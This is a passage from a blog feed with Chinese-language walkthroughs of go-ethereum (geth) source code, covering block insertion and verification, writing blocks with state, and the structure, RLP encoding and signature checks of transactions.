class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ethash *Ethash)</span></span> VerifyHeaders(chain consensus.ChainReader, headers []*types.Header, seals []<span class="type">bool</span>) (<span class="keyword">chan</span>&lt;- <span class="keyword">struct</span>&#123;&#125;, &lt;-<span class="keyword">chan</span> <span class="type">error</span>) &#123;</span><br><span class="line">  ...</span><br><span class="line">  errors[index] = ethash.verifyHeaderWorker(chain, headers, seals, index)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检验块的祖先是否已知以及块是否已知 并调用verifyheader</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ethash *Ethash)</span></span> verifyHeaderWorker(chain consensus.ChainReader, headers []*types.Header, seals []<span class="type">bool</span>, index <span class="type">int</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> parent *types.Header</span><br><span class="line"><span class="keyword">if</span> index == <span class="number">0</span> &#123;</span><br><span class="line">parent = chain.GetHeader(headers[<span class="number">0</span>].ParentHash, headers[<span class="number">0</span>].Number.Uint64()<span class="number">-1</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> headers[index<span class="number">-1</span>].Hash() == headers[index].ParentHash &#123;</span><br><span class="line">parent = headers[index<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> parent == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> consensus.ErrUnknownAncestor</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> chain.GetHeader(headers[index].Hash(), headers[index].Number.Uint64()) != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span> <span class="comment">// known block</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//调用verifyHeader进行更深的校验，也是最核心的校验</span></span><br><span class="line"><span class="keyword">return</span> ethash.verifyHeader(chain, headers[index], parent, <span class="literal">false</span>, seals[index])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会调用 verifyHeaderWorker 进行校验，主要检验块的祖先是否已知以及块是否已知，接着会调用 verifyHeader 进行更深的校验，也是最核心的校验，大概做了以下几件事：</p><ul><li><p>header.Extra 不可超过 32 字节</p></li><li><p>header.Time 不能超过 15 秒，15 秒以后的就被认定为未来的块</p></li><li><p>当前 header 的时间戳不可以等于父块的时间戳</p></li><li><p>根据难度计算算法得出的 expected 必须和 header.Difficulty 一致。</p></li><li><p>Gas limit 要 &lt;= 2 ^ 63-1</p></li><li><p>gasUsed&lt;= gasLimit</p></li><li><p>Gas limit 要在允许范围内</p></li><li><p>块号必须是父块加 1(不能有间隔)</p></li><li><p>根据 ethash.VerifySeal 去验证块是否满足 POW 难度要求</p></li></ul><p>到此验证 header 的事情就做完了。</p><hr><p>④：循环校验 body</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">block, err := it.next()</span><br><span class="line">-&gt; ValidateBody</span><br><span class="line">-&gt; VerifyUncles</span><br></pre></td></tr></table></figure><p>包括以下错误：</p><ul><li>block 已知</li><li>uncle 太多</li><li>重复的 uncle</li><li>uncle 是祖先块</li><li>uncle 哈希不匹配</li><li>交易哈希不匹配</li><li>未知祖先</li><li>祖先块的状态无法获取</li></ul><p>如果 block 存在，且是已知块，则写入已知块。</p><p>如果是祖先块的状态无法获取的错误，则作为侧链插入：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.insertSideChain(block, it)</span><br></pre></td></tr></table></figure><p>如果是未来块或者未知祖先，则添加未来块：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.addFutureBlock(block);</span><br></pre></td></tr></table></figure><p>注意这里的添加 futureBlock，会被扔进 futureBlocks 里面去，在 NewBlockChain 的时候会开启新的 goroutine:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> bc.update()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> update() &#123;</span><br><span class="line">  futureTimer := time.NewTicker(<span class="number">5</span> * time.Second)</span><br><span class="line">  <span class="keyword">for</span>&#123;</span><br><span class="line">    <span class="keyword">select</span>&#123;</span><br><span class="line">      <span class="keyword">case</span> &lt;-futureTimer.C:</span><br><span class="line">bc.procFutureBlocks()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> procFutureBlocks() &#123;</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">for</span> _, hash := <span class="keyword">range</span> bc.futureBlocks.Keys() &#123;</span><br><span class="line"><span class="keyword">if</span> block, exist := bc.futureBlocks.Peek(hash); exist &#123;</span><br><span class="line">blocks = <span class="built_in">append</span>(blocks, block.(*types.Block))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> blocks &#123;</span><br><span class="line">bc.InsertChain(blocks[i : i+<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会开启一个计时器，每 5 秒就会去执行插入这些未来的块。</p><p>如果是其他错误，直接中断，并且报告坏块。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bc.futureBlocks.Remove(block.Hash())</span><br><span class="line">...</span><br><span class="line">bc.reportBlock(block, <span class="literal">nil</span>, err)</span><br></pre></td></tr></table></figure><hr><p>⑤：没有校验错误</p><ul><li><p>如果是坏块，则报告；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> BadHashes[block.Hash()] &#123;</span><br><span class="line">bc.reportBlock(block, <span class="literal">nil</span>, ErrBlacklistedHash)</span><br><span class="line"><span class="keyword">return</span> it.index, ErrBlacklistedHash</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果是未知块，则写入未知块；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err == ErrKnownBlock &#123;</span><br><span class="line">logger := log.Debug</span><br><span class="line"><span class="keyword">if</span> bc.chainConfig.Clique == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.Warn</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> err := bc.writeKnownBlock(block); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> it.index, err</span><br><span class="line">&#125;</span><br><span class="line">stats.processed++</span><br><span class="line">lastCanon = block</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据给定 trie，创建 state；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parent := it.previous()</span><br><span class="line"><span class="keyword">if</span> parent == <span class="literal">nil</span> &#123;</span><br><span class="line">parent = bc.GetHeader(block.ParentHash(), block.NumberU64()<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line">statedb, err := state.New(parent.Root, bc.stateCache)</span><br></pre></td></tr></table></figure></li><li><p>执行块中的交易：</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">receipts, logs, usedGas, err := bc.processor.Process(block, statedb, bc.vmConfig)</span><br></pre></td></tr></table></figure><ul><li>使用默认的 validator 校验状态：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.validator.ValidateState(block, statedb, receipts, usedGas);</span><br></pre></td></tr></table></figure><ul><li>将块写入到区块链中并获取状态：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status, err := bc.writeBlockWithState(block, receipts, logs, statedb, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure><hr><p>⑥：校验写入区块的状态</p><ul><li>CanonStatTy ： 插入成功新的 block</li><li>SideStatTy：插入成功新的分叉区块</li><li>Default：插入未知状态的 block</li></ul><hr><p>⑦：如果还有块，并且是未来块的话，那么将块添加到未来块的缓存中去</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.addFutureBlock(block)</span><br></pre></td></tr></table></figure><p>至此 insertChain 大概介绍清楚。</p><hr><h2 id="将块和关联状态写入到数据库">将块和关联状态写入到数据库</h2><p>函数：<strong>WriteBlockWithState</strong></p><p>①：计算父块的 total td</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptd := bc.GetTd(block.ParentHash(), block.NumberU64()<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>②：添加待插入块本身的 td ,并将此时最新的 total td 存储到数据库中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.hc.WriteTd(block.Hash(), block.NumberU64(), externTd)</span><br></pre></td></tr></table></figure><p>③：将块的 header 和 body 分别序列化到数据库</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rawdb.WriteBlock(bc.db, block)</span><br><span class="line">-&gt;WriteBody(db, block.Hash(), block.NumberU64(), block.Body())</span><br><span class="line">-&gt;WriteHeader(db, block.Header())</span><br></pre></td></tr></table></figure><p>④：将状态写入底层内存 Trie 数据库</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.Commit(bc.chainConfig.IsEIP158(block.Number()))</span><br></pre></td></tr></table></figure><p>⑤：存储一个块的所有交易数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rawdb.WriteReceipts(batch, block.Hash(), block.NumberU64(), receipts)</span><br></pre></td></tr></table></figure><p>⑥：将新的 head 块注入到当前链中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> status == CanonStatTy &#123;</span><br><span class="line">bc.insert(block)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>存储分配给规范块的哈希</li><li>存储头块的哈希</li><li>存储最新的快</li><li>更新 currentFastBlock</li></ul><p>到此 writeBlockWithState 结束，从上面可以知道，insertChain 的最终还是调用了 writeBlockWithState 的 insert 方法完成了最终的插入动作。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>理解交易</title>
    <link href="https://www.blog-blockchain.xyz/geth/understand-tx/"/>
    <id>https://www.blog-blockchain.xyz/geth/understand-tx/</id>
    <published>2022-08-25T01:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.925Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><h2 id="交易的入门介绍">交易的入门介绍</h2><p>这里不作额外说明，可以学习<a href="https://ethereum.org/zh/developers/docs/transactions/">官方文档</a>、以及仓库中提供的《区块链基础》</p><h2 id="交易的结构">交易的结构</h2><h3 id="类型">类型</h3><p>传统交易（Legacy）是以太坊最初的交易类型，但是后来逐渐出现了 <code>AccessList</code> 类型的交易和 <code>DynamicFee</code> 类型的交易，他们分别由 EIP-2930 和 EIP-1559 定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">LegacyTxType     = <span class="literal">iota</span> <span class="comment">//传统交易</span></span><br><span class="line">AccessListTxType        <span class="comment">//EIP-2930 定义的访问列表</span></span><br><span class="line">DynamicFeeTxType        <span class="comment">//EIP-1559 定义的动态交易费</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>关于这两个 EIP 的详细说明请看后文的『影响交易的 EIP』</p><p>下面是交易的定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">   inner TxData <span class="comment">// Consensus contents of a transaction</span></span><br><span class="line">   <span class="comment">//time 包的特点是时间分成显示和计算两部分</span></span><br><span class="line">   time time.Time <span class="comment">// Time first seen locally (spam avoidance)</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/*atomic 是 Golang 中底层硬件的原子操作的封装，可以提高并发的效率</span></span><br><span class="line"><span class="comment">   atomic.Value 是容器，用来“原子地”存储（Store）和加载（Load）任意类型的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   一个或者多个操作在 CPU 执行的过程中不被中断的特性，称为原子性，</span></span><br><span class="line"><span class="comment">   对外表现成一个不可分割的整体，他们要么都执行，要么都不执行，外界不会看到他们只执行到一半的状态。</span></span><br><span class="line"><span class="comment">   更多见：https://studygolang.com/articles/23242</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 使用频次高且CPU计算量大，因此下面缓存下面三个</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// caches</span></span><br><span class="line">   hash atomic.Value</span><br><span class="line">   size atomic.Value</span><br><span class="line">   from atomic.Value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TxData</code> 是交易自身的核心数据，包括了所有需要的信息，这些字段都很基础，请读者自行阅读其他书籍或者博客了解。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TxData <span class="keyword">interface</span> &#123;</span><br><span class="line">   txType() <span class="type">byte</span> <span class="comment">// returns the type ID</span></span><br><span class="line">   <span class="built_in">copy</span>() TxData <span class="comment">// creates a deep copy and initializes all fields</span></span><br><span class="line"></span><br><span class="line">   chainID() *big.Int</span><br><span class="line">   accessList() AccessList</span><br><span class="line">   data() []<span class="type">byte</span></span><br><span class="line">   gas() <span class="type">uint64</span></span><br><span class="line">   gasPrice() *big.Int</span><br><span class="line">   gasTipCap() *big.Int <span class="comment">// EIP-1559 单位 gas 最大超过基础费用的溢价</span></span><br><span class="line">   gasFeeCap() *big.Int <span class="comment">//EIP-1559 单位 gas 的最大价格</span></span><br><span class="line">   value() *big.Int</span><br><span class="line">   nonce() <span class="type">uint64</span></span><br><span class="line">   to() *common.Address</span><br><span class="line"></span><br><span class="line">   rawSignatureValues() (v, r, s *big.Int)</span><br><span class="line">   setSignatureValues(chainID, v, r, s *big.Int)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>gasTipCap()</code> 最高的小费单价。</li><li><code>gasFeeCap()</code> 最高的 gas 费。</li><li><code>AccessList</code> 里面是由包含地址和存储的 Key 的元组构成的切片，Key 是哈希类型。</li><li><code>data</code> 是调用合约时的 ABI 编码后的函数签名和参数。</li><li><code>v</code>, <code>s</code>, <code>R</code> 是签名，它们和 <code>TxData</code> 相匹配，可以根据签名和 <code>TxData</code> 恢复出地址，作为验证信息。</li></ul><h3 id="编码">编码</h3><p>交易也需要编码后才能写入数据库。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EncodeRLP implements rlp.Encoder</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span></span> EncodeRLP(w io.Writer) <span class="type">error</span> &#123;</span><br><span class="line">   <span class="comment">//对于传统的无类型的交易，直接编码 data 字段就可以了</span></span><br><span class="line">   <span class="keyword">if</span> tx.Type() == LegacyTxType &#123;</span><br><span class="line">      <span class="keyword">return</span> rlp.Encode(w, tx.inner) <span class="comment">//第二个参数编码后写入 rlp 缓冲区</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// EIP-2718 将交易类型封装到了交易对象中，可以方便地处理对应操作，</span></span><br><span class="line">   <span class="comment">//减少因匹配交易所有字段造成的不必要消耗</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// It&#x27;s an EIP-2718 typed TX envelope.</span></span><br><span class="line">   buf := encodeBufferPool.Get().(*bytes.Buffer)</span><br><span class="line">   <span class="keyword">defer</span> encodeBufferPool.Put(buf)</span><br><span class="line">   buf.Reset()</span><br><span class="line"></span><br><span class="line">   <span class="comment">//序列化后存储在 buf 中</span></span><br><span class="line">   <span class="keyword">if</span> err := tx.encodeTyped(buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//为了保证向后兼容性再进行了一次封装，</span></span><br><span class="line">   <span class="keyword">return</span> rlp.Encode(w, buf.Bytes())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encodeTyped writes the canonical encoding of a typed transaction to w.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span></span> encodeTyped(w *bytes.Buffer) <span class="type">error</span> &#123;</span><br><span class="line">   w.WriteByte(tx.Type()) <span class="comment">//先写入类型，第一个字节</span></span><br><span class="line">   <span class="keyword">return</span> rlp.Encode(w, tx.inner)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然也有配套的解码函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DecodeRLP implements rlp.Decoder</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span></span> DecodeRLP(s *rlp.Stream) <span class="type">error</span> &#123;</span><br><span class="line">   kind, size, err := s.Kind()</span><br><span class="line">   <span class="keyword">switch</span> &#123;</span><br><span class="line">   <span class="keyword">case</span> err != <span class="literal">nil</span>:</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   <span class="keyword">case</span> kind == rlp.List:</span><br><span class="line">      <span class="comment">// It&#x27;s a legacy transaction.</span></span><br><span class="line">      <span class="keyword">var</span> inner LegacyTx</span><br><span class="line">      err := s.Decode(&amp;inner)</span><br><span class="line">      <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">         tx.setDecoded(&amp;inner, <span class="type">int</span>(rlp.ListSize(size)))</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   <span class="keyword">case</span> kind == rlp.String:</span><br><span class="line">      <span class="comment">// It&#x27;s an EIP-2718 typed TX envelope.</span></span><br><span class="line">      <span class="keyword">var</span> b []<span class="type">byte</span></span><br><span class="line">      <span class="keyword">if</span> b, err = s.Bytes(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> err</span><br><span class="line">      &#125;</span><br><span class="line">      inner, err := tx.decodeTyped(b)</span><br><span class="line">      <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">         tx.setDecoded(inner, <span class="built_in">len</span>(b))</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> rlp.ErrExpectedList</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便封装和解封装，有对应的 <code>Marshal</code> 和 <code>Unmarshal</code> ，这在源码中还是比较常见的，这里暂时不做进一步的分析。具体需要研究编码时可深入学习</p><h3 id="签名">签名</h3><p>这是检查签名合法性的主要函数，<code>isProtectedV</code> 是 EIP-155 的内容，可见后文。如果通过了对 <code>v</code> 的检查，那么可以从 <code>v</code> 中获取 <code>chainid</code>，最后检查签名的三个参数是否合法，这涉及密码学内容，暂时不作深入。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查签名的合法性</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sanityCheckSignature</span><span class="params">(v *big.Int, r *big.Int, s *big.Int, maybeProtected <span class="type">bool</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> isProtectedV(v) &amp;&amp; !maybeProtected &#123;</span><br><span class="line"><span class="keyword">return</span> ErrUnexpectedProtection</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> plainV <span class="type">byte</span></span><br><span class="line"><span class="keyword">if</span> isProtectedV(v) &#123;</span><br><span class="line">chainID := deriveChainId(v).Uint64()</span><br><span class="line">plainV = <span class="type">byte</span>(v.Uint64() - <span class="number">35</span> - <span class="number">2</span>*chainID)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> maybeProtected &#123;</span><br><span class="line"><span class="comment">// Only EIP-155 signatures can be optionally protected. Since</span></span><br><span class="line"><span class="comment">// we determined this v value is not protected, it must be a</span></span><br><span class="line"><span class="comment">// raw 27 or 28.</span></span><br><span class="line">plainV = <span class="type">byte</span>(v.Uint64() - <span class="number">27</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// If the signature is not optionally protected, we assume it</span></span><br><span class="line"><span class="comment">// must already be equal to the recovery id.</span></span><br><span class="line">plainV = <span class="type">byte</span>(v.Uint64())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !crypto.ValidateSignatureValues(plainV, r, s, <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ErrInvalidSig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//是否开启了防止重放攻击</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isProtectedV</span><span class="params">(V *big.Int)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">if</span> V.BitLen() &lt;= <span class="number">8</span> &#123;</span><br><span class="line">v := V.Uint64()</span><br><span class="line"><span class="keyword">return</span> v != <span class="number">27</span> &amp;&amp; v != <span class="number">28</span> &amp;&amp; v != <span class="number">1</span> &amp;&amp; v != <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// anything not 27 or 28 is considered protected</span></span><br><span 